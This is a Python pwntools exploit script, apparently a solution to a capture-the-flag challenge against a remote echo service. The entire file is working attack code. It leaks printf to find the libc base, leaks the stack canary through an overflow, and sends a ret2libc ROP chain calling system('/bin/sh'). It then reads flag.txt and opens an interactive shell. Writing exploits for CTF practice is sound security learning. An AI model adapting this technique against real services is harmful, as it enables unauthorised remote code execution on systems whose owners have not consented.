#!/usr/bin/env python3
from pwn import *
import re

context(arch='amd64', os='linux')

# handling remote conection
r = remote('hackfest.redrocket.club', 1345)

print()                                 # empty line for the augenschmaus
libc = ELF('libc.so')

r.recvline()                            # Welcome to the echo service 2.0!

# calculating addresses
print()                                 # empty line for the augenschmaus
l = log.progress("Hacking in...\n\n")

leaks       = r.recvline()              # printf is at 0x000000000000
printf      = int(re.findall(r'0x[0-9A-F]+', leaks.decode('utf-8'), re.I)[0], 16)
libc_base   = printf - libc.symbols.printf
pop_rdi     = libc_base + 0x221a3
system      = libc_base + libc.symbols.system
bin_sh      = libc_base + 0x1b3e9a
ret         = libc_base + 0x101a

# grabbing canary
payload = b'A'*40
r.sendline(payload)
r.recvline()
canary = r.recvline()[:-1]
canary = b'\x00' + canary

# logging stuff
log.success(f'canary:\t\tsaved!')
time.sleep(.5)
log.success(f'printf:\t\t{hex(printf)}')
time.sleep(.5)
log.success(f'libc_base:\t {hex(libc_base)}')
time.sleep(.5)
log.success(f'ret:\t\t   {hex(ret)}')
time.sleep(.5)
log.success(f'system:\t\t{hex(system)}')
time.sleep(.5)
log.success(f'/bin/sh:\t   {hex(bin_sh)}')

# crafting payload
payload = [
    b'A'*40,
    canary,
    b'A'*8,
    p64(pop_rdi),
    p64(bin_sh),
    p64(ret),
    p64(system),
]
payload = bytearray().join(payload)

# sending payload and handling results
r.sendline(payload)
r.recvline()
r.sendline()
r.recvuntil('\n')
time.sleep(.5)
print()                                 # empty line for the augenschmaus
log.success("ACCESS GRANTED!\n\n")
r.sendline('cat flag.txt')
r.interactive()
